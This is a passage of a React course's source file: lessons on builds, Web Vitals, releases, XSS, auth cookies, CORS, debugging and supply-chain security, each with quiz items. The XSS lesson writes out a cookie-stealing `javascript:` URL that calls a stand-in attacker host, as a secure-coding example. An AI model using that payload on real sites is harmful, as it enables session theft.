// vite.config.js
export default defineConfig({
  plugins: [react()],
  base: '/',                       // '/app/' when deployed in a subdirectory
  build: { sourcemap: 'hidden' },  // emit maps, do not link them from the bundle
  server: {
    proxy: { '/api': { target: 'http://localhost:4000', changeOrigin: true } },
  },
});
\`\`\`

The \`proxy\` line makes the app and the API share an origin in development, so CORS never appears locally — which is exactly why CORS errors feel like they only happen in production (Chapter 7).

### Source maps keep minified traces readable

\`Cannot read properties of undefined (reading 'map') at n (index-B7dK2p.js:1:48213)\` tells you nothing. A source map turns it back into your file and line. Emit them, upload them to your error tracker as a deploy step, and use \`'hidden'\` so browsers do not fetch them from your public server.

### Before the first deploy

- Run \`npm run build && npm run preview\` and click through the real bundle locally.
- Confirm the SPA rewrite from Chapter 3, or refreshing a deep link 404s.
- Check import casing. \`./components/navbar\` resolves on a case-insensitive Mac and fails on a Linux build agent — the single most common cause of a build that passes locally and dies in CI.
- Set every \`VITE_\` variable in CI as well as in your local \`.env\`. A missing one becomes \`undefined\` inside a template string and produces requests to \`undefined/courses\`.
        `,
        [
          q('Which Cache-Control pairing matches a hashed production build?', [
            'index.html immutable for a year, hashed assets no-cache',
            'Both files no-cache',
            'Hashed assets immutable for a year, index.html no-cache',
            'Both files immutable for a year',
          ], 2, 'The content hash makes an asset URL permanently valid, while index.html is the pointer that must be re-read on every visit.'),
          q('You restart the container with a new API_URL but do not rebuild. What does the app use?', [
            'The new URL, from the next page load onwards',
            'The old value, because it was substituted into the bundle at build time',
            'The new URL, after the bundle re-hashes itself',
            'The new URL, but only during server rendering',
          ], 1, 'Client env vars are compile-time text substitution, so changing the process environment afterwards changes nothing in the shipped JavaScript.'),
          q('What does build: { sourcemap: "hidden" } mean?', [
            'No source maps are generated at all',
            'Maps are inlined into the JavaScript as data URLs',
            'Maps are generated only for CSS files',
            'Maps are generated but the bundle carries no link to them, so you upload them to your error tracker instead',
          ], 3, 'You get readable production stack traces in your monitoring tool without publishing your source to anyone who opens DevTools.'),
        ]
      ),
        lesson('Core Web Vitals in a React App', 14, `
Chapter 4 optimised the render loop. **Core Web Vitals** measure what the person holding the phone experiences, which is a different question and the one search engines report on.

| Metric | Measures | Good | Poor |
|---|---|---|---|
| **LCP** | When the largest element in the viewport paints | ≤ 2.5 s | > 4 s |
| **INP** | Worst interaction-to-next-paint across the visit | ≤ 200 ms | > 500 ms |
| **CLS** | How much visible content shifts unexpectedly | ≤ 0.1 | > 0.25 |

Lighthouse gives lab numbers from your laptop. Field data from real devices is what counts:

\`\`\`js
import { onLCP, onINP, onCLS } from 'web-vitals';

function send(metric) {
  navigator.sendBeacon('/api/vitals', JSON.stringify({
    name: metric.name, value: metric.value, path: location.pathname,
  }));
}
onLCP(send); onINP(send); onCLS(send);
\`\`\`

Track the **75th percentile**, never the mean — vitals are a distribution, and an average hides the quarter of your users having a bad time.

### LCP: paint the biggest thing early

\`\`\`jsx
{/* The hero: never lazy, always prioritised */}
<img src={hero} width={1200} height={630} fetchPriority="high" alt="" />

{/* Below the fold: the opposite */}
<img src={thumb} width={320} height={180} loading="lazy" decoding="async" alt="" />
\`\`\`

Then keep the LCP element out from behind JavaScript. A route-level \`lazy()\` chunk (Chapter 3) on the landing page forces the browser to download, parse and execute your bundle before the hero can exist. Split the admin screens, not the front door. Finally, fonts: \`font-display: swap\` paints text immediately in a fallback face, and preconnecting to the font host saves a round trip.

\`\`\`html
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
\`\`\`

### CLS: reserve the space before the content lands

Every image needs intrinsic dimensions — \`width\` and \`height\` attributes, or \`aspect-ratio\` in CSS. Without them the browser lays out at zero height and reflows when the bytes arrive, jolting everything below.

The React-specific version is a skeleton that is not the size of the thing it replaces:

\`\`\`jsx
// BAD: 20px of text becomes a 260px card, and the page jumps
if (isPending) return <p>Loading…</p>;

// GOOD: the placeholder occupies the final layout
if (isPending) return <div className="card-skeleton" style={{ minHeight: 260 }} />;
\`\`\`

The other classic is a cookie banner, promo bar or ad injected **above** existing content after paint. Reserve its height from the first render, or take it out of the flow with fixed positioning.

### INP: keep the main thread free

INP replaced FID in 2024 and is the strictest of the three, because it samples every interaction rather than the first. One 300 ms task — filtering 20,000 rows on each keystroke — fails it on its own.

\`\`\`jsx
function CourseSearch({ courses }) {
  const [query, setQuery] = useState('');
  const deferred = useDeferredValue(query);   // deliberately lags behind

  const results = useMemo(
    () => courses.filter(c => c.title.toLowerCase().includes(deferred.toLowerCase())),
    [courses, deferred]
  );

  return (
    <>
      <input value={query} onChange={e => setQuery(e.target.value)} />
      <ResultList items={results} isStale={query !== deferred} />
    </>
  );
}
\`\`\`

The input updates in the urgent render; the expensive list re-renders in a low-priority pass React can interrupt and restart. \`useTransition\` does the same for state you set yourself:

\`\`\`jsx
const [isPending, startTransition] = useTransition();
startTransition(() => setTab(next));   // the click stays instant
\`\`\`

Neither makes the work faster — they change *when* it blocks. If the list is still slow, remove work: virtualise it (Chapter 4), debounce the request (Chapter 2), or filter on the server.

### The mistake to avoid

Tuning until Lighthouse says 100 on a desktop with fibre. Throttle DevTools to Slow 4G with a 4× CPU slowdown, or read your field data. That is the device most of your users are actually holding.
        `,
        [
          q('At which percentile should Core Web Vitals be reported?', [
            'The mean, so a single outlier cannot dominate',
            'The median, as the typical visitor',
            'The 75th percentile, because vitals are a distribution and an average hides the worst quarter of visits',
            'The 99th percentile, to catch every bad session',
          ], 2, 'Vitals are graded at p75 precisely because the mean flatters a site where one user in four is having a slow, janky visit.'),
          q('Why does a route-level lazy() chunk on the landing page hurt LCP?', [
            'The chunk is always larger than the main bundle',
            'The browser must download, parse and execute JavaScript before the hero element can exist at all',
            'Suspense fallbacks are excluded from measurement',
            'lazy disables image preloading for the whole document',
          ], 1, 'Splitting the front door pushes the largest paint behind a network round trip plus parse time, so split the admin screens instead.'),
          q('How does INP differ from the FID it replaced?', [
            'It measures time to first byte instead of interaction',
            'It measures only the first interaction, more accurately',
            'It is a lab-only metric produced by Lighthouse',
            'It samples every interaction in the visit and reports the worst, so one 300 ms handler fails it',
          ], 3, 'Because INP takes the worst interaction rather than the first, a single expensive keystroke handler is enough to fail the metric.'),
        ]
      ),
        lesson('Release Pipelines, Flags, and Rollback', 13, `
A deploy should be the least interesting event of the week: one command, a single artifact, reversible in a minute. Everything below exists to protect those three properties.

### The pipeline, stage by stage

| Stage | Command | Fails on |
|---|---|---|
| Install | \`npm ci\` | A lockfile that disagrees with package.json |
| Static checks | \`tsc --noEmit\`, \`eslint .\` | Type errors, hook-rule violations |
| Tests | \`vitest run\` | The suite from Chapter 5 |
| Build | \`npm run build\` | Anything the dev server tolerated |
| Deploy | upload \`dist/\` | — |

\`npm ci\` rather than \`npm install\` is the load-bearing detail. It installs exactly the tree recorded in the lockfile and refuses to reconcile a drifted \`package.json\`, so CI builds what you tested instead of whatever was published to npm this morning.

Keep the whole run under ten minutes. Past that, people stop waiting for it before merging, and a pipeline nobody waits for is decoration.

### Build once, or build per environment — decide knowingly

Environment variables are substituted at build time, so one artifact cannot carry both the staging and the production API URL. There are two honest options:

- **Build per environment.** Simple, and what most teams do. The cost is that the bundle you tested in staging is not byte-for-byte the one you ship.
- **Build once and fetch \`/config.json\` at boot.** One artifact promoted through every environment. The cost is a request before the app can call an API, plus a config file to deploy and keep correct.

Choose one on purpose. The failure mode is a team that believes it does the first while a stale variable in CI quietly does the second badly.

### Preview deploys

Give every pull request its own URL, pointed at a scratch API with scratch data. Reviewers click instead of imagining, designers check the real thing, and the keyboard pass from Chapter 5 happens before merge rather than after release. Never point a preview environment at the production database; sooner or later somebody tests a delete.

### Old chunks outlive old deploys

Someone has had your tab open since before the last release. They click a lazily loaded route (Chapter 3) and the browser asks for a hashed chunk you deleted twenty minutes ago:

\`\`\`
TypeError: Failed to fetch dynamically imported module
\`\`\`

Two fixes, and you want both. Keep the previous few releases' assets on the host for a week — they are small, and content hashes mean nothing ever collides. Then handle the rejection so the tab can rescue itself:

\`\`\`jsx
const Analytics = lazy(() =>
  import('./routes/Analytics').catch(() => {
    window.location.reload();        // this tab is running a build that no longer exists
    return new Promise(() => {});    // never resolves; the reload takes over
  })
);
\`\`\`

The polite version polls a \`/version.json\` build id and offers a "new version available, reload" banner instead of reloading under the user's cursor mid-sentence.

### Rollback beats forward-fixing

Keep the previous release addressable and switch back to it in one step. Roll back first and diagnose afterwards, with the site healthy while you read stack traces. That only works if a deploy is atomic — every file swapped together, never half-published — and if the API the old bundle expects still exists, which is why backend changes should add fields before they remove them.

### Flags decouple deploying from releasing

\`\`\`jsx
{flags.newCheckout ? <CheckoutV2 /> : <CheckoutV1 />}
\`\`\`

Merge a half-built feature behind a flag, ship it dark, enable it for staff, then 1% of users, then everyone — and turn it off in seconds without a build. The tax is real: every flag doubles a code path and every forgotten flag is permanent dead weight, so give each one an owner and a removal date on the day you add it.
        `,
        [
          q('Why does the pipeline run npm ci rather than npm install?', [
            'It skips devDependencies, which CI does not need',
            'It caches node_modules between runs automatically',
            'It is the only npm command permitted in a CI environment',
            'It installs exactly the tree in the lockfile and fails if the lockfile and package.json disagree',
          ], 3, 'Reproducibility is the point: CI must build the dependency tree you tested, not resolve fresh versions at install time.'),
          q('A user with a tab open since before the last deploy clicks a lazy route and sees "Failed to fetch dynamically imported module". What fixes it?', [
            'Turning off code splitting for that route',
            'Caching index.html for a year so the tab keeps working',
            "Retaining the previous release's hashed assets, and reloading the page when a chunk import rejects",
            'Serving the chunk from a separate domain',
          ], 2, 'Their index.html references chunks from a build that no longer exists, so keep the old assets around and recover by reloading into the current build.'),
          q('What does a feature flag give you that a deploy does not?', [
            'A smaller production bundle',
            'The ability to enable a feature for 1% of users, or switch it off entirely, without shipping a new build',
            'Automatic rollback of database migrations',
            'A faster CI pipeline',
          ], 1, 'Flags separate the act of shipping code from the act of turning it on, which is what makes a bad release a config change rather than an emergency deploy.'),
        ]
      ),
      ],
      [
        q('A rejected fetch inside an onClick handler leaves the screen spinning, even though the component sits inside an error boundary. Why?', [
          'The boundary is missing componentDidCatch',
          'Boundaries only catch errors thrown while rendering, in lifecycle methods, or in constructors',
          'The fallback prop was not provided',
          'Async errors need react-error-boundary instead of a class',
        ], 1, 'Event handlers and promises run outside the render phase, so their errors never reach a boundary unless you rethrow during render.'),
        q('VITE_API_KEY is defined in .env and read through import.meta.env. Where does the value end up?', [
          'Only on the build machine',
          'Encrypted inside the bundle',
          'Read at runtime from the hosting provider',
          'Inlined as a plain string in the JavaScript every visitor downloads',
        ], 3, 'Client env vars are compile-time text substitution, so anything referenced from browser code is public by definition.'),
        q('Images shipped without width and height attributes mainly damage which metric?', [
          'CLS, because the layout reflows once the real dimensions arrive',
          'LCP, because the image downloads more slowly',
          'INP, because decoding blocks the main thread',
          'TTFB, because the server responds later',
        ], 0, 'Reserving the space up front prevents the reflow that pushes already-painted content down the page.'),
        q('Typing into a filter over 20,000 rows makes the input stutter. Which API is designed for exactly this?', [
          'useLayoutEffect around the filter',
          'React.memo on every row',
          'useDeferredValue, so the input stays urgent while the list re-renders at low priority',
          'A second useState for the filtered array',
        ], 2, 'Deferring the expensive value lets React interrupt the heavy render to keep keystrokes responsive.'),
      ]
    ),
    chapter(
      'Security and Debugging',
      'The attacks that reach the browser, the tokens you must not leak, and how to find a bug you cannot reproduce.',
      [
        lesson('XSS and Trusted Output', 13, `
React escapes every value you interpolate into JSX. A \`userBio\` containing \`<script>alert(1)</script>\` renders as visible text, because React creates a text node instead of parsing HTML. That default covers almost everything — which is precisely why the remaining holes get missed.

### The three ways out of the escaping

**1. \`dangerouslySetInnerHTML\`.** The name is a warning, and it is accurate.

\`\`\`jsx
// Straight to the HTML parser: stored XSS in one line
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
\`\`\`

Store the raw text, sanitise on the way out, every time:

\`\`\`jsx
import DOMPurify from 'dompurify';
import { marked } from 'marked';

function Comment({ markdown }) {
  const html = useMemo(
    () => DOMPurify.sanitize(marked.parse(markdown), {
      ALLOWED_TAGS: ['p', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'a'],
      ALLOWED_ATTR: ['href'],
    }),
    [markdown]
  );
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
\`\`\`

An allow-list of tags beats a block-list of bad ones: you cannot enumerate every attack, but you can enumerate the nine tags a comment is allowed to use.

**2. URLs in \`href\` and \`src\`.**

\`\`\`jsx
<a href={user.website}>Website</a>
\`\`\`

If \`user.website\` is \`javascript:fetch('https://evil.tld?c=' + document.cookie)\`, that link is an attack that fires on click. React 19 blocks that one scheme — it swaps the attribute for a stub that throws \`React has blocked a javascript: URL as a security precaution\` — but React 18 and earlier only logged a warning and rendered the URL as written, and no version of React filters \`data:\` or \`vbscript:\`, or the URLs you hand to \`location.assign\` and \`window.open\`. Validate the protocol yourself:

\`\`\`js
function safeHref(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol) ? parsed.href : '#';
  } catch {
    return '#';                 // not a URL at all
  }
}
\`\`\`

**3. Spreading unvetted props.**

\`\`\`jsx
<div {...propsFromApi} />   // one of those keys could be dangerouslySetInnerHTML
\`\`\`

Pick the props you want by name. A spread is a promise that you trust every key in that object, forever.

### Defence in depth: a Content Security Policy

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
\`\`\`

A CSP blocks inline scripts and unknown script hosts, so an injection that slips past your sanitiser has nowhere to execute. Adding one to an existing app usually breaks something on the first attempt — that is the policy telling you what your page actually loads. Start in \`Content-Security-Policy-Report-Only\` mode and read the reports for a week before enforcing.

### Third-party scripts run with your privileges

A chat widget, a tag manager or an analytics snippet on your origin can read the DOM, your cookies that are not \`httpOnly\`, and anything in \`localStorage\`. Add \`integrity\` hashes to the script tags that support them, keep the vendor count low, and treat "marketing added a script" as a code change.

### The rule

Escape by default, sanitise the moment you opt out, validate URLs by protocol, and never let user text reach \`innerHTML\`, \`eval\`, or \`new Function\`. Rendering is not the only sink either — a search term written into \`document.title\`, or a redirect built from \`location.hash\`, is the same bug wearing different clothes.
        `,
        [
          q('Why does the sanitiser configure ALLOWED_TAGS rather than stripping known-bad tags?', [
            'You cannot enumerate every attack, but you can enumerate the handful of tags a comment is allowed to use',
            'An allow-list runs faster on long documents',
            'DOMPurify supports nothing else',
            'Block-lists break markdown rendering',
          ], 0, 'An allow-list fails closed: anything the attacker invents that you did not list is removed by default.'),
          q('What does the safeHref helper protect against that React does not?', [
            'Cross-site request forgery on link clicks',
            'Broken links that 404',
            'data: and vbscript: URLs, and URLs handed to location.assign or window.open',
            'Mixed content warnings on HTTPS pages',
          ], 2, 'React only ever intervened on the javascript: scheme in JSX attributes, and never on the navigation APIs you call yourself.'),
          q('What is the recommended way to introduce a CSP to an existing app?', [
            'Enforce it immediately and fix whatever breaks',
            'Start in Content-Security-Policy-Report-Only, read the reports for a week, then enforce',
            'Apply it only to the index.html response',
            'Allow unsafe-inline first and tighten the policy later',
          ], 1, 'Report-only mode tells you what the page really loads without breaking it for users while you find out.'),
        ]
      ),
        lesson('Auth Tokens, Cookies, and CORS', 14, `
Where the access token lives decides which attacks you are exposed to. There are two realistic options and they fail in different directions.

| | \`localStorage\` | httpOnly cookie |
|---|---|---|
| Readable by JavaScript | Yes — any XSS steals it | No |
| Sent automatically | No, you attach it | Yes, by the browser |
| CSRF exposure | None | Needs \`SameSite\` |
| Survives a refresh | Yes | Yes |

Because a single XSS (previous lesson) empties \`localStorage\` in one line, the default choice is a cookie the browser will not let JavaScript read:

\`\`\`js
// Server (Express) — the browser stores it; client JS cannot see it
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 1000 * 60 * 60 * 24 * 7,
});
\`\`\`

\`\`\`js
// Client — cookies are not sent cross-origin unless you ask
await fetch('https://api.example.com/me', { credentials: 'include' });
\`\`\`

\`SameSite=lax\` stops the cookie riding along on cross-site POSTs, which removes most CSRF without a token dance.

### CORS is the browser protecting the user, not the server

A CORS error does not mean the request was blocked. It was sent, the server answered, and the browser refused to hand you the response. Two rules explain most of the confusion:

- A request carrying a custom header (\`Authorization\`, \`X-Request-Id\`) or a JSON content type is **not simple**, so the browser first sends an \`OPTIONS\` **preflight**. If the server does not answer it with matching \`Access-Control-Allow-Headers\`, the real request never happens. The tell-tale symptom: everything worked until someone added a header.
- With \`credentials: 'include'\`, \`Access-Control-Allow-Origin: *\` is rejected. The server must echo the exact origin and add \`Access-Control-Allow-Credentials: true\`.

The dev proxy from Chapter 6 hides all of this locally, which is why CORS is so often a deploy-day discovery. Hit the real API origin once before launch.

### One refresh, not fifty

\`\`\`js
let refreshing = null;   // module scope: shared by every caller

async function apiFetch(path, options = {}) {
  const run = () => fetch(path, { ...options, credentials: 'include' });
  let res = await run();

  if (res.status === 401) {
    // Every 401 in flight waits on the SAME refresh promise
    refreshing ??= fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' })
      .finally(() => { refreshing = null; });

    if (!(await refreshing).ok) { window.location.assign('/login'); return res; }
    res = await run();                       // retry once with the new cookie
  }
  return res;
}
\`\`\`

Without that shared promise, a dashboard with six queries fires six refresh requests at once. If your backend rotates refresh tokens, five of them fail, and the user is logged out at random — a bug that only appears on the busiest screen.

### Logout must clear the cache too

\`\`\`js
async function logout(queryClient) {
  await fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });
  queryClient.clear();                 // drop every cached query (Chapter 3)
  window.location.assign('/login');    // a full load wipes in-memory state
}
\`\`\`

Skip \`clear()\` on a shared machine and the next person sees the previous user's cached dashboard for a second. It looks like a catastrophic authorisation failure; it is a stale cache.

### The client is not a security boundary

A hidden admin button, the \`RequireAuth\` wrapper from Chapter 3, a disabled input — all of it is user experience. Every one is a DevTools edit away from being bypassed, so the server authorises every request independently, using the session it verified itself.
        `,
        [
          q('With credentials: "include", why is Access-Control-Allow-Origin: * rejected?', [
            'The wildcard is only valid for GET requests',
            'The browser requires the exact origin plus Access-Control-Allow-Credentials: true',
            'Cookies are never sent cross-origin under any configuration',
            'The wildcard form has been deprecated by browsers',
          ], 1, 'Credentialed requests must name the origin explicitly, so a wildcard can never authorise sending someone cookies.'),
          q('A dashboard with six queries logs the user out at random once the token expires. What fixes it?', [
            'Retrying each 401 three times before giving up',
            'A longer access token lifetime',
            'Moving the token into localStorage',
            'One shared refresh promise, so every in-flight 401 waits on the same refresh',
          ], 3, 'Six parallel refreshes against a backend that rotates refresh tokens means five of them present a token that has already been used.'),
          q('What does SameSite=lax buy you?', [
            'It prevents any XSS on the page from reading the cookie',
            'It encrypts the cookie value in transit',
            'It keeps the cookie off cross-site POSTs, which removes most CSRF without a token dance',
            'It scopes the cookie to a single subdomain',
          ], 2, 'SameSite governs when the browser attaches the cookie, so a form posted from another site simply arrives without a session.'),
        ]
      ),
        lesson('Debugging What You Cannot Reproduce', 14, `
A bug you can reproduce is half fixed. The skill worth building is for the other kind: it happens to one user, on one browser, only in production.

### Make a reproduction cheap to obtain

Ask for three things: the URL, the console error, and the failing request from the Network tab. Then make that URL worth asking for — the filters, tab and page you pushed into the query string in Chapter 1 turn a vague report into something you can open. A screen whose entire input is props plus URL params is reproducible in one click; one that depends on hidden context and \`localStorage\` is not.

### The tools, in the order you should reach for them

**React DevTools → Components.** Select the misbehaving node and read its real props, state and hook values. Edit one live to confirm which input drives the wrong output — faster than any log statement.

**"Highlight updates when components render".** Flashing outlines on components unrelated to your click is Chapter 3's context problem, visible in five seconds.

**Profiler with "Record why each component rendered".** It attributes each render to props, state, hooks or parent, which settles the argument Chapter 4 warned you not to have from intuition.

**The browser debugger.** Conditional breakpoints beat sprinkled logs — right-click the gutter and enter \`item.id === 4173\`. Turn on "Pause on caught exceptions" when something is swallowing an error.

\`\`\`js
console.table(rows.slice(0, 20));   // structured and sortable
console.count('render:' + id);      // cheaper than a counter in state
\`\`\`

### The production-only shortlist

| Symptom | Usual cause |
|---|---|
| Blank page after deploy, fine locally | Import path casing, or a cached \`index.html\` pointing at deleted chunks (Chapter 6) |
| Requests to \`undefined/api/...\` | A \`VITE_\` variable missing in CI |
| 404 on refresh, fine when navigating | Missing SPA rewrite (Chapter 3) |
| Wrong record after fast clicking | Unaborted fetch race (Chapter 2) |
| Breaks for one user only | Extension or ad blocker, a stale service worker, locale, or timezone |
| Safari only | An unsupported API, or \`new Date('2026-08-20 10:00')\`, which Safari refuses to parse |

Two of those you can force on your own machine: throttle the network to Slow 4G to expose races, and run with a different timezone (\`TZ=Asia/Karachi npm run dev\`) to expose date bugs.

### Instrument once, benefit for a year

Error monitoring with the source maps from Chapter 6 uploaded, breadcrumbs for route changes, clicks and requests, and a release tag on every deploy. That turns "it crashed" into a stack trace in your own code plus the last twelve things the user did. Add the user id and the app version to every report; "only version 2.4.1, only on iOS" is often the whole diagnosis.

### Narrow before you fix

Bisect rather than stare. \`git bisect start\`, mark a good and a bad commit, and let it find the change in a handful of steps. Inside a single screen, the same idea works by commenting out half the subtree.

### The classic mistake

\`\`\`jsx
const name = user?.profile?.name ?? '';   // the crash is gone, the bug is not
\`\`\`

Optional chaining added at the crash site is a decision to render wrong data silently. Ask why the profile is missing — an unauthenticated request, a race, a bad migration — and fix it there. If you genuinely must guard, log the case so you still learn how often it happens.

Then do the last step, which is Chapter 5's: write the failing test first, watch it fail for the right reason, and only then apply the fix. A bug without a regression test is a bug you have agreed to fix twice.
        `,
        [
          q('With "Highlight updates when components render" on, you see outlines flashing on components unrelated to your click. What does that point at?', [
            'A missing key on a list',
            'A context whose value changes identity on every provider render',
            'An unaborted fetch racing with a newer one',
            'A stale service worker serving old chunks',
          ], 1, 'Unrelated components repainting together is the visual signature of a context update fanning out to every consumer.'),
          q('A date bug is reported by one user in another country. Which local reproduction does the lesson suggest first?', [
            'Run the dev server with a different TZ environment variable',
            'Switch the browser display language',
            'Throttle the network to Slow 4G',
            'Disable all browser extensions',
          ], 0, 'Forcing a different timezone reproduces the whole class of date bugs on your own machine in one command.'),
          q('Adding user?.profile?.name ?? "" at the crash site is a mistake because', [
            'optional chaining costs a measurable amount of performance',
            '?? and || are not interchangeable in that position',
            'it silences the crash while rendering wrong data, instead of answering why the profile is missing',
            'it stops the error monitor from collecting breadcrumbs',
          ], 2, 'The crash was the only evidence that something upstream is broken, so guarding it converts a loud bug into a silent one.'),
        ]
      ),
        lesson('Dependencies and the Supply Chain', 13, `
Run \`npm ls --all | wc -l\` on an ordinary React app and the answer is in the thousands. Most of the code you ship was written by people you will never meet, and it runs with your privileges: on the build machine at install time, and in your users' browsers afterwards.

### The lockfile is the artifact

Commit \`package-lock.json\`, review its diffs like code, and install with \`npm ci\` in CI. A range such as \`^1.2.3\` means "anything compatible", so without a lockfile your build installs whatever was published this morning — including the malicious 1.2.4 that was live for three hours before npm pulled it.

A dependency bump whose lockfile diff runs to 400 lines for one patch release is worth reading rather than merging on sight.

### Install time is code execution

A \`postinstall\` script runs arbitrary code on the machine doing the install, with that machine's credentials: your SSH keys locally, your deploy tokens in CI. That is the primary target of npm supply-chain attacks, and it fires before you have run a single line of the package.

\`\`\`
npm ci --ignore-scripts
\`\`\`

That works for most frontend trees. The exceptions are packages with native binaries or a browser download — esbuild, sharp, playwright — which you allow explicitly, one at a time. Apply it in CI too, where the credentials are worth more than the ones on any laptop.

### Choosing a dependency

| Signal | Good | Worrying |
|---|---|---|
| Last release | Within the past year | Four years ago, with open security issues |
| Transitive dependencies | Two or three | Ninety |
| Bundle size | Checked before installing | Never measured |
| Maintainers | Several, or a funded organisation | One account, no release history |
| Could you write it yourself? | No, the problem is genuinely hard | Yes, in thirty lines |

That last row matters more than teams admit. A four-line utility package is a permanent account-takeover risk taken on in exchange for four lines of code, while a well-maintained library that gets date arithmetic right is a bargain at 40 KB. Check the cost before installing: Chapter 4's bundle visualiser will find the accidental 300 KB import afterwards, but not installing it is cheaper.

### Auditing without drowning

\`npm audit\` on a fresh app reports dozens of advisories, most of them in dev-only transitive packages. Triage each one with two questions: **is it in the production bundle**, and **is the vulnerable code path reachable from the way we use it?** A regex denial-of-service in a build-time plugin is not the same class of problem as prototype pollution in a library that parses user input at runtime.

\`\`\`
npm audit --omit=dev     # only what actually ships to browsers
npm audit fix            # semver-compatible upgrades, safe to review and merge
npm audit fix --force    # bumps majors and breaks builds; never under time pressure
\`\`\`

Then keep moving: automated pull requests from Dependabot or Renovate, patch and minor updates grouped and merged on green CI, majors read by a human. Weekly upgrades are boring, and a deferred year is a two-week migration.

### The name is part of the review

Typosquats sit directly beside real packages in search results and in editor autocomplete: \`reacct-router\`, \`crossenv\` for \`cross-env\`, a plausible-looking types package that nobody publishes. Read the name character by character before installing, check the weekly downloads and the repository link, and be most careful with names that arrived from a blog post, a chat log or an AI assistant — confirm the package exists and is the one you mean before you run \`npm i\`.

### What runs on your origin

A CDN \`<script>\` tag is standing permission for that vendor to execute code inside your users' sessions. Add \`integrity\` hashes where the vendor publishes them, self-host what you reasonably can, and count third-party scripts the way you count dependencies: fewer, larger, better maintained. The Content Security Policy from earlier in this chapter is what limits the damage on the day one of them is compromised.
        `,
        [
          q('npm audit reports 43 advisories on a fresh React app. What is the right first move?', [
            'Run npm audit fix --force until the count reaches zero',
            'Pin every dependency to an exact version',
            'Triage each one: is it in the production bundle, and is the vulnerable path reachable from how you use it',
            'Delete the lockfile and reinstall from scratch',
          ], 2, 'Most advisories sit in dev-only transitive packages, so severity means nothing until you know whether the code ships and can be reached.'),
          q('What is the specific risk of a postinstall script?', [
            'It executes arbitrary code on the installing machine, with whatever credentials that machine holds',
            'It only runs during production builds, where mistakes are costly',
            'It rewrites package.json without asking',
            'It adds a few seconds to the install and nothing more',
          ], 0, 'The script runs before you have used the package at all, which is why install-time execution is the favourite entry point for supply-chain attacks.'),
          q('A blog post recommends a package called reacct-hook-form. Before installing it you should', [
            'install it and see whether the build passes',
            'read the name character by character and confirm it is the package you mean, since typosquats sit beside real names',
            'trust it if it has more than 1,000 weekly downloads',
            'check only that it ships TypeScript types',
          ], 1, 'Typosquatting relies on a name that looks right at a glance, so the check has to happen before the install, not after.'),
        ]
      ),
      ],
      [
        q('React escapes interpolated values automatically. Which of these can still put attacker-supplied HTML into the page?', [
          '<p>{userBio}</p>',
          '<img alt={userName} src={safeUrl} />',
          '<div {...propsFromApi} /> where the API object may carry a dangerouslySetInnerHTML key',
          '<input defaultValue={userName} />',
        ], 2, 'A spread trusts every key in the object forever, so one dangerouslySetInnerHTML key reaches the HTML parser; the other three are escaped text or attribute values React never parses as HTML.'),
        q('An access token is kept in localStorage. What is the specific risk that a cookie avoids?', [
          'Any successful XSS can read it and send it elsewhere',
          'It is lost when the tab closes',
          'It cannot be attached to fetch requests',
          'Browsers block it on HTTPS origins',
        ], 0, 'localStorage is readable by any script on the page, whereas an httpOnly cookie is invisible to JavaScript entirely.'),
        q('A cross-origin fetch worked until an Authorization header was added, and now fails with a CORS error. What changed?', [
          'Custom headers are never allowed cross-origin',
          'The request needs credentials: include',
          'The API must be served over HTTPS',
          'The request became non-simple, so the browser sends an OPTIONS preflight the server does not answer',
        ], 3, 'Any custom header triggers a preflight, and the real request is only sent if the server approves those headers.'),
        q('A deploy produces a blank page in production while everything works locally. Which cause fits best?', [
          'A missing Suspense boundary',
          'An import path whose casing differs from the filename, which only fails on a case-sensitive build machine',
          'Too many re-renders',
          'A stale closure in a useCallback',
        ], 1, 'macOS filesystems are case-insensitive, so a mis-cased import resolves locally and fails to resolve on the Linux build agent.'),
      ]
    ),
      chapter(
      'TypeScript in React',
      'Modelling props, state, and API responses so that whole classes of the runtime bugs you just learned to debug stop compiling.',
      [
      lesson('Typing Props, State, and Events', 13, `
A teammate renames \`userId\` to \`accountId\` on a props type at 4pm. The compiler names eleven call sites before the branch is pushed. In the JavaScript twin of the same repo, that rename shipped, and a billing settings page rendered \`undefined\` for a week, because reading \`props.userId\` off an object that no longer has it is not an error. It is just \`undefined\`.

That is the whole trade. You pay in annotations, and you get paid in renames, deletions and refactors that are safe to do on a Friday.

### Props are a plain type, not React.FC

\`\`\`tsx
type AvatarProps = {
  name: string;
  src?: string;
  size?: 'sm' | 'md' | 'lg';
  onSelect?: (name: string) => void;
};

export function Avatar({ name, src, size = 'md', onSelect }: AvatarProps) {
  return (
    <button className={'avatar avatar-' + size} onClick={() => onSelect?.(name)}>
      {src ? <img src={src} alt="" /> : name.slice(0, 2).toUpperCase()}
    </button>
  );
}
\`\`\`

Two details do most of the work here. \`size\` is a union of three literals rather than \`string\`, so \`size="medium"\` fails to compile and your editor offers the three real values. And the props type is applied to the parameter, not to the function. \`React.FC<AvatarProps>\` buys a return type check you rarely need, and it fights you the moment the component becomes generic. When a component accepts children, say so: \`children: React.ReactNode\`.

### State that starts empty needs help

\`\`\`tsx
const [rows, setRows] = useState([]);        // rows is never[]
setRows(invoices);                           // error: Invoice is not never
const [rows, setRows] = useState<Invoice[]>([]);      // fixed
const [selected, setSelected] = useState<Invoice | null>(null);
\`\`\`

Inference reads the initial value, and an empty array carries no element type. \`useState(null)\` is worse: the state is locked to \`null\` forever. The rule is short. Annotate when the initial value is empty, null or a narrower literal than you want; let inference handle \`useState(0)\` and \`useState('')\`.

### Events

Inline handlers are contextually typed, so annotating them is noise:

\`\`\`tsx
<input onChange={(e) => setQuery(e.currentTarget.value)} />
\`\`\`

Extract that handler into a named function and the context is gone, so you supply the type yourself.

| What you are handling | The type to reach for |
|---|---|
| Text input change | \`React.ChangeEvent<HTMLInputElement>\` |
| Form submit | \`React.FormEvent<HTMLFormElement>\` |
| Button click | \`React.MouseEvent<HTMLButtonElement>\` |
| Key press in a field | \`React.KeyboardEvent<HTMLInputElement>\` |
| Select change | \`React.ChangeEvent<HTMLSelectElement>\` |

